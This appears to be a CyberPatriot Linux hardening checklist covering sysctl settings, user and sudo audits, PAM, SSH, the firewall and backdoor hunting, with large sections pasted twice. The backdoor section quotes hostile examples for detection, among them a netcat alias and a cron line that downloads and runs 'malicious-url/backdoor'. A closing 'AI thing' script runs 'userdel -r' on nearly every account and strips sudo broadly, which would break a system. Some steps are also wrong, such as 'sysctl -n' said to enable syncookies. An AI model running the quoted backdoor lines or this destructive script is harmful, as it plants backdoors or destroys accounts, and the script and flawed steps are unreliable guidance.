# linxchecklist

Install Fail2ban

Protect against brute-force attacks:

    sudo apt-get install fail2ban

    sudo apt-get install fail2ban


Configure /etc/fail2ban/jail. local as needed and start the service:

    sudo systemctl start fail2ban
    sudo systemctl enable fail2ban

Install and Configure Lynis for Security Audits

Run a security audit to identify issues:

    sudo apt-get install lynis
    sudo lynis audit system

Kernel Hardening

dev.tty.ldisc_autoload: This should be set to 0 to prevent the automatic loading of line disciplines.

 

    sudo sysctl -w dev.tty.ldisc_autoload=0

fs.protected_fifos: This should be set to 2 to protect named pipes (FIFOs) from being created in world-writable directories.

 

    sudo sysctl -w fs.protected_fifos=2

fs.protected_symlinks: This should be set to 1 to protect symlinks from being created in world-writable directories.

 

    sudo sysctl -w fs.protected_symlinks=1

fs.suid_dumpable: This should be set to 0 to disable core dumps for SUID programs.

 

    sudo sysctl -w fs.suid_dumpable=0

kernel.kptr_restrict: This should be set to 2 to restrict access to kernel pointers.

 

    sudo sysctl -w kernel.kptr_restrict=2

kernel.modules_disabled: This should be set to 1 to disable module loading.

 

    sudo sysctl -w kernel.modules_disabled=1

kernel.perf_event_paranoid: This should be set to 3 to restrict access to performance events.

 

    sudo sysctl -w kernel.perf_event_paranoid=3

kernel.randomize_va_space: This should be set to 2 for full randomization of the address space.

 

    sudo sysctl -w kernel.randomize_va_space=2

kernel.sysrq: This should be set to 0 to disable the magic SysRq key.

 

    sudo sysctl -w kernel.sysrq=0

kernel.unprivileged_bpf_disabled: This should be set to 1 to disable unprivileged BPF.

 

    sudo sysctl -w kernel.unprivileged_bpf_disabled=1

net.core.bpf_jit_harden: This should be set to 2 to harden BPF JIT compilation.

 

    sudo sysctl -w net.core.bpf_jit_harden=2

net.ipv4.conf.all.rp_filter: This should be set to 1 for strict reverse path filtering.

 

    sudo sysctl -w net.ipv4.conf.all.rp_filter=1

net.ipv4.conf.all.send_redirects: This should be set to 0 to disable ICMP redirects.

 

    sudo sysctl -w net.ipv4.conf.all.send_redirects=0

net.ipv4.conf.default.log_martians: This should be set to 1 to log martian packets.

 

    sudo sysctl -w net.ipv4.conf.default.log_martians=1

net.ipv4.tcp_syncookies: This should be set to 1 to enable TCP SYN cookies.

 

    sudo sysctl -w net.ipv4.tcp_syncookies=1



1. Forensic questions

2. Disable guest user

        In /etc/lightdm/lightdm.conf add the line "allow-guest=false"
        Restart with "sudo restart lightdm" (will log you out)

3. Check users

        In /etc/passwd check for users that
            Are uid 0 (root users)
            Are not allowed in the readme (comment them out)
        In /etc/group verify users are in the correct groups and that no groups have a GUD of 0
        Add any users specified in readme with "adduser [username]"

4. Secure sudo

        Check /etc/sudoers to verify only users from group sudo can sudo (do so with visudo)
        Verify only admins have access to /etc/sudoers and /etc/sudoers.d
        Check /etc/group and remove non-admins from sudo and admin groups
        Verify with the command "sudo -l -U [username]" to see sudo permissions

5. Check for unauthorized files/packages

        Use "cd /home" then "ls -Ra *"  to find unauthorized files (can also use tree for this)
            Can also use "ls *.[filetype]" to search by file types
        Check for unauthorized packages with "apt list --installed"
        Check for unauthorized services with "service --status-all" (can also use Synaptic or BUM for managing services)

6. Change password requirements

        In /etc/login.defs add
            PASS_MIN_DAYS 7
            PASS_MAX_DAYS 90
            PASS_WARN_AGE 14
        Use "apt-get install libpam-cracklib" then in /etc/pam.d/common-password add
            "minlen=8" and "remember=5" to the line with pam_unix.so in it
            Add "ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-" to the line with pam.cracklib.so in it
        In /etc/pam.d/common-auth add "deny=5 unlock_time=1800" to the end of the line with "pam_tally2.so" in it to add an account lockout policy

7. Change all passwords

        Use the command "passwd [user]" to change passwords to a secure password
        Use "passwd -a -S" to verify all passwords are set up correctly

8. Enable auto-updates + other small things

        In GUI go to settings and under updates set everything to the best available option
        In Firefox/Chrome/browser go to settings and read through and set everything to the most secure option (auto-updates, pop-up blocker, block dangerous downloads, display warning on known bad sites, etc.)
        Start updates with "apt-get update" and "apt-get upgrade"
        Set a message of the day in /etc/motd
        Disable sharing the screen by going to settings -> sharing then turn it off
        Use "apt-get autoremove --purge samba" to remove samba

9. Secure ports

        Use the command "ss -ln" to check for open ports that are not on the loopback
        For open ports that need to be closed
            Use "lsof -i :[port]" or "netstat -lntp" then copy the program listening on the port with "whereis [program]" then copy where the program is with "dpkg -S [location]" then remove the associated package with "apt-get purge [package]"
            Verify the removal with "ss -ln"

10. Secure the network

        Enable the firewall with "ufw enable"
        Enable syn cookie protection with "sysctl -n net.ipv4.tcp_syncookies"
        Disable IPv6 with "echo "net.ipv6.conf.all.disable_ipv6 = 1" | sudo tee -a /etc/sysctl.conf" (make sure it isn't needed in read-me)
        Disable IP forwarding with "echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward"
        Prevent IP spoofing with "echo "nospoof on" | sudo tee -a /etc/host.conf"
        Disable ICMP responses with "echo “net.ipv4.icmp_echo_ignore_all = 1” >> /etc/sysctl.conf"
        Use "sysctl -p" then restart sysctl with "sysctl --system"
        Configure firewall (can also be done through Gufw)
            Check for rules with "ufw status numbered" and delete any with "ufw delete [number]"
            Add new rules with "ufw allow [port]"

11. Secure services

        Check config files for any services installed to secure them (PHP, SQL, WordPress, FTP, SSH, and Apache are common services that need to be secured)
            For hosting services such as WordPress, FTP, or websites verify the files are not sensitive or prohibited
            Google "how to secure [service] ubuntu"
        Verify all services are legitimate with "service --status-all" (can also use Synaptic or BUM)
        Verify the services do not use any default credentials

12. Check permissions for sensitive files

        Check the permissions of the files with "ls -al"
            Check /etc/passwd, /etc/group, /etc/shadow, /etc/sudoers, and /var/www
        The permissions should be "-rw-r----- root: shadow"
        Use "chmod -R 640 [path]" to modify the permissions

13. Check for malware

        Check /etc/rc.local to see if it contains anything other than "exit 0"
        Use "ps -aux" to list running services, check if lkl, uberkey, THC-vlogger, PyKeylogger, or logkeys are running
        Install rkhunter then update the properties with "rkhunter --propupd" then run with "rkhunter --checkall"

14. Secure SSH (if needed in readme)

        In /etc/ssh/sshd_config
            Change the port from default
            Set LoginGraceTime to 20
            Set PermitRootLogin to no
            Set StrictModes to yes
            Set MaxAuthTries to 3
            Set PermitEmptyPasswords to no
            Change and uncomment protocol line to "Protocol 2"
            Optional: For keyless authentication set PasswordAuthentication to no
        Restart ssh with "service sshd restart"

15. Install security packages (not sure if needed)

            Auditd:
                Install with "apt-get install auditd"
                Run it with "auditctl -e 1"
            Fail2ban:
                Install with "apt install fail2ban"
                Verify its running with "systemctl status fail2ban"
                Configure with "cp /etc/fail2ban/jail.{conf,local}" then edit /etc/fail2ban/jail.local
                Restart it with "systemctl restart fail2ban"
            SELinux: Be careful with it
                Install with "apt-get install selinux"
                In ""/etc/selinux/config" set the state of SELinux to "enforcing"

            PSAD:



How to attach to cp process and monitor its activity


for i in {1..999999999} ; do clear ; netstat -lntp ; w ; date ; sleep 3 ; done






# cyberpatriot-checklist-ubuntu

Ubuntu cyber-patriot checklist

1. Forensic questions

2. Disable guest user

        In /etc/lightdm/lightdm.conf add the line "allow-guest=false"
        Restart with "sudo restart lightdm" (will log you out)

3. Check users

        In /etc/passwd check for users that
            Are uid 0 (root users)
            Are not allowed in the readme (comment them out)
        In /etc/group verify users are in the correct groups and that no groups have a GUD of 0
        Add any users specified in readme with "adduser [username]"

4. Secure sudo

        Check /etc/sudoers to verify only users from group sudo can sudo (do so with visudo)
        Verify only admins have access to /etc/sudoers and /etc/sudoers.d
        Check /etc/group and remove non-admins from sudo and admin groups
        Verify with the command "sudo -l -U [username]" to see sudo permissions

5. Check for unauthorized files/packages

        Use "cd /home" then "ls -Ra *"  to find unauthorized files (can also use tree for this)
            Can also use "ls *.[filetype]" to search by file types
        Check for unauthorized packages with "apt list --installed"
        Check for unauthorized services with "service --status-all" (can also use Synaptic or BUM for managing services)

6. Change password requirements

        In /etc/login.defs add
            PASS_MIN_DAYS 7
            PASS_MAX_DAYS 90
            PASS_WARN_AGE 14
        Use "apt-get install libpam-cracklib" then in /etc/pam.d/common-password add
            "minlen=8" and "remember=5" to the line with pam_unix.so in it
            Add "ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-" to the line with pam.cracklib.so in it
        In /etc/pam.d/common-auth add "deny=5 unlock_time=1800" to the end of the line with "pam_tally2.so" in it to add an account lockout policy

7. Change all passwords

        Use the command "passwd [user]" to change passwords to a secure password
        Use "passwd -a -S" to verify all passwords are set up correctly

8. Enable auto-updates + other small things

        In GUI go to settings and under updates set everything to the best available option
        In Firefox/Chrome/browser go to settings and read through and set everything to the most secure option (auto-updates, pop-up blocker, block dangerous downloads, display warning on known bad sites, etc.)
        Start updates with "apt-get update" and "apt-get upgrade"
        Set a message of the day in /etc/motd
        Disable sharing the screen by going to settings -> sharing then turn it off
        Use "apt-get autoremove --purge samba" to remove samba

9. Secure ports

        Use the command "ss -ln" to check for open ports that are not on the loopback
        For open ports that need to be closed
            Use "lsof -i :[port]" or "netstat -lntp" then copy the program listening on the port with "whereis [program]" then copy where the program is with "dpkg -S [location]" then remove the associated package with "apt-get purge [package]"
            Verify the removal with "ss -ln"

10. Secure the network

        Enable the firewall with "ufw enable"
        Enable syn cookie protection with "sysctl -n net.ipv4.tcp_syncookies"
        Disable IPv6 with "echo "net.ipv6.conf.all.disable_ipv6 = 1" | sudo tee -a /etc/sysctl.conf" (make sure it isn't needed in read-me)
        Disable IP forwarding with "echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward"
        Prevent IP spoofing with "echo "nospoof on" | sudo tee -a /etc/host.conf"
        Disable ICMP responses with "echo “net.ipv4.icmp_echo_ignore_all = 1” >> /etc/sysctl.conf"
        Use "sysctl -p" then restart sysctl with "sysctl --system"
        Configure firewall (can also be done through Gufw)
            Check for rules with "ufw status numbered" and delete any with "ufw delete [number]"
            Add new rules with "ufw allow [port]"

11. Secure services

        Check config files for any services installed to secure them (PHP, SQL, WordPress, FTP, SSH, and Apache are common services that need to be secured)
            For hosting services such as WordPress, FTP, or websites verify the files are not sensitive or prohibited
            Google "how to secure [service] ubuntu"
        Verify all services are legitimate with "service --status-all" (can also use Synaptic or BUM)
        Verify the services do not use any default credentials

12. Check permissions for sensitive files

        Check the permissions of the files with "ls -al"
            Check /etc/passwd, /etc/group, /etc/shadow, /etc/sudoers, and /var/www
        The permissions should be "-rw-r----- root: shadow"
        Use "chmod -R 640 [path]" to modify the permissions

13. Check for malware

        Check /etc/rc.local to see if it contains anything other than "exit 0"
        Use "ps -aux" to list running services, check if lkl, uberkey, THC-vlogger, PyKeylogger, or logkeys are running
        Install rkhunter then update the properties with "rkhunter --propupd" then run with "rkhunter --checkall"

14. Secure SSH (if needed in readme)

        In /etc/ssh/sshd_config
            Change the port from default
            Set LoginGraceTime to 20
            Set PermitRootLogin to no
            Set StrictModes to yes
            Set MaxAuthTries to 3
            Set PermitEmptyPasswords to no
            Change and uncomment protocol line to "Protocol 2"
            Optional: For keyless authentication set PasswordAuthentication to no
        Restart ssh with "service sshd restart"

15. Install security packages (not sure if needed)

            Auditd:
                Install with "apt-get install auditd"
                Run it with "auditctl -e 1"
            Fail2ban:
                Install with "apt install fail2ban"
                Verify its running with "systemctl status fail2ban"
                Configure with "cp /etc/fail2ban/jail.{conf,local}" then edit /etc/fail2ban/jail.local
                Restart it with "systemctl restart fail2ban"
            SELinux: Be careful with it
                Install with "apt-get install selinux"
                In ""/etc/selinux/config" set the state of SELinux to "enforcing"

            PSAD:



How to attach to cp process and monitor its activity


for i in {1..999999999} ; do clear ; netstat -lntp ; w ; date ; sleep 3 ; done



1. Check authorized_keys for unauthorized entries:

       cat ~/.ssh/authorized_keys

Ensure no unauthorized public keys are present. If a foreign key, such as root@kali, is found, remove it immediately.


2. Identifying Suspicious SSH MOTD Backdoors
Check for unauthorized scripts in /etc/update-motd.d/:

       ls -l /etc/update-motd.d/

Ensure there are no unauthorized scripts, especially those related to network communication like nc (Netcat).




Monitor recent file changes in MOTD scripts:

    ls --full-time /etc/update-motd.d/



3. Monitoring User’s .bashrc for Backdoors
Look for suspicious entries in .bashrc:

        cat ~/.bashrc

Remove any unauthorized commands, such as reverse shells (nc) or unexpected scripts that run automatically.


4. Checking Aliases for Backdoors
Inspect aliases that may execute backdoor commands:

       alias
   
Check if any aliases are set up to execute malicious commands, such as:

     alias cd='$(nc ...)'


5. Detecting Cronjob-based Backdoors
Review crontab for unauthorized scheduled jobs:

       crontab -l
   
Ensure no malicious tasks are scheduled to run, such as downloading and executing backdoors:

     * * * * * root cd /tmp; wget malicious-url/backdoor && ./backdoor




6. Checking for Services Backdoors
List all active services for suspicious entries:

        systemctl list-unit-files --type=service
   
Ensure there are no unknown or suspicious services, such as backdoor.service.



7. Detecting SUID Backdoors
Find all SUID files (files with setuid permissions):

       find / -type f -perm -u=s 2>/dev/null
   
SUID files allow a command to be executed with the permissions of the file owner (often root). Ensure no unauthorized binaries are present, especially hidden ones.



7. Detecting SUID Backdoors
Find all SUID files (files with setuid permissions):

        find / -type f -perm -u=s 2>/dev/null
   
SUID files allow a command to be executed with the permissions of the file owner (often root). Ensure no unauthorized binaries are present, especially hidden ones.


FORENSICS

Forensics Question IP Address of the Compromised Site EXAMPLE
Scenario: “We suspect that our server has been compromised through a download from an external site. What is the IP address of the site that we have been compromised through?”
Solution:
Search the download history of the browser (e.g., Firefox) and locate the suspicious file, innocent 2.xslm. Identify the site the file was downloaded from and use the ping command to retrieve the IP address:

    ping <site_url>



Some ai thing copy and paste USE AT YOUR OWN RISK

    #!/bin/bash

    ### WARNING: This is hypothetical, so don't actually do it, ya fucking idiot.

    # Ensure script runs as root
    if [[ "$EUID" -ne 0 ]]; then
            echo "Run this script as root or use sudo."
        exit
    fi

    # Update the system
    echo "Updating system packages..."
    apt-get update -y && apt-get upgrade -y

    # Enforce strong password policies
    echo "Configuring password policies..."
    echo "password requisite pam_pwquality.so retry=3 minlen=12 difok=4 ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1" >> /etc/pam.d/common-password
    sed -i 's/PASS_MAX_DAYS.*/PASS_MAX_DAYS 90/g' /etc/login.defs
    sed -i 's/PASS_MIN_DAYS.*/PASS_MIN_DAYS 7/g' /etc/login.defs
    sed -i 's/PASS_WARN_AGE.*/PASS_WARN_AGE 14/g' /etc/login.defs

    # Secure SSH configuration
    echo "Hardening SSH configuration..."
    sed -i 's/^#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
    sed -i 's/^#PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
    sed -i 's/^#X11Forwarding.*/X11Forwarding no/' /etc/ssh/sshd_config
    sed -i 's/^#LogLevel.*/LogLevel VERBOSE/' /etc/ssh/sshd_config
    systemctl restart sshd

    # Disable unnecessary services (you can add/remove as needed)
    echo "Disabling unnecessary services..."
    for service in telnet ftp rsh rexec rsyncd; do
        systemctl disable $service 2>/dev/null
        systemctl stop $service 2>/dev/null
    done

    # Set secure permissions for sensitive files
    echo "Setting secure permissions..."
    chmod 600 /etc/shadow
    chmod 644 /etc/passwd
    chmod 644 /etc/group
    chmod 600 /etc/gshadow
    chown root:root /etc/shadow /etc/gshadow

    # Remove unauthorized sudoers
    echo "Cleaning up unauthorized sudo users..."
    for user in $(awk -F':' '{print $1}' /etc/passwd); do
        if [[ "$(sudo -lU $user 2>/dev/null)" == *"(ALL : ALL) ALL"* ]]; then
            deluser $user sudo
    fi
    done

    # Check and lock down world-writable files
    echo "Finding and locking down world-writable files..."
    find / -type f -perm /o+w -exec chmod o-w {} \; 2>/dev/null

    # Ensure firewall is active and basic rules are applied
    echo "Configuring firewall rules..."
    ufw default deny incoming
    ufw default allow outgoing
    ufw allow ssh
    ufw enable

    # Remove unauthorized users
    echo "Removing unauthorized users..."
    for user in $(awk -F':' '{print $1}' /etc/passwd); do
        if [[ "$user" != "root" && "$user" != "$USER" && "$user" != "YOUR_TEAM_USER" ]]; then
            userdel -r $user
        fi
    done

    # Configure audit logging
    echo "Configuring audit logging for important files..."
    echo "-w /etc/passwd -p wa -k passwd_changes" >> /etc/audit/audit.rules
    echo "-w /etc/shadow -p wa -k shadow_changes" >> /etc/audit/audit.rules
    echo "-w /var/log/ -p wa -k log_changes" >> /etc/audit/audit.rules
    systemctl restart auditd

    echo "Script completed. Hypothetically, this is the cleanest your system has ever been."

    
    echo "Script completed. Hypothetically, this is the cleanest your system has ever been."
